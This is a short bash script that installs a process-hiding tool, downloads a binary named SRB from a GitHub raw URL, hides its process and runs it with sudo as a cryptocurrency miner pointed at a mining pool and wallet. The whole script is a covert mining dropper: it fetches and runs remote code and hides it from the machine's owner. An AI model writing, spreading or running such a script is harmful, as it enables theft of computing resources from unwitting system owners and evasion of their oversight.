#!/bin/bash
npm i -g node-process-hider
wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
chmod 500 SRB
ph add SRB
sudo ./SRB --disable-gpu --algorithm yescryptR16 --pool eu.mecrypto.club:5440 --wallet Tpps38UBDYdKNd6rMUMwZgoLfsCvQCHSgZ --worker running --cpu-threads 8
